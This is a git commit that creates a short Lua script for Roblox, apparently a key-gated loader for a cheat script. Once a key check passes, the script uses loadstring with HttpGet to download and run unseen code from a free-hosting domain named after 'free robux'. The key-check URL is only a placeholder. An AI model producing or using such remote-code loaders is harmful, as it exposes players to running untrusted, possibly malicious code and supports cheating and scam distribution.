7f9bc57a2c383f2622c02b727d8e10e9725b07b5
hggfgf <80595702+hggfgf@users.noreply.github.com>
2021-05-26 18:06:08 +0300

    Create script.lua

---
+++ script.lua
@@ -0,0 +1,7 @@
+local key = _G.Key
+local check = "checkhere?key=" .. key
+if game:HttpGet(check) == "Whitelisted" then
+loadstring(game:HttpGet("https://freerobuxmethodhhtp1.000webhostapp.com/akeysystemlol545758723585342/scirpt.lua"))()
+else
+game.Players.LocalPlayer:Kick("Invalid Key! Please Rejoin And Try Again.")
+end
